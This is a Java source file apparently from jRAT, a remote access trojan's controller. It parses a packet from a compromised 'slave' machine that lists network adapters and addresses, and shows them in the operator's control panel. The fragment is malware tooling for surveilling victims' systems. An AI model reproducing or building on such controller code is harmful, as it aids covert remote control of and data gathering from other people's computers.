package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlAdapters;


public class Packet56NetworkAdapter implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String displayname = slave.readLine();
		String name = slave.readLine();

		int size;
		try {
			size = slave.readInt();
		} catch (Exception ex) {
			ex.printStackTrace();
			return;
		}

		String[] addresses = new String[size];
		String daddresses = "";

		for (int i = 0; i < size; i++) {
			String str = slave.readLine();
			addresses[i] = str;
			if (daddresses.length() == 0) {
				daddresses += str;
			} else {
				daddresses += ", " + str;
			}
		}

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlAdapters panel = (PanelControlAdapters) frame.panels.get("network adapters");
			panel.getModel().addRow(new Object[] { displayname, name, daddresses });
		}
	}

}
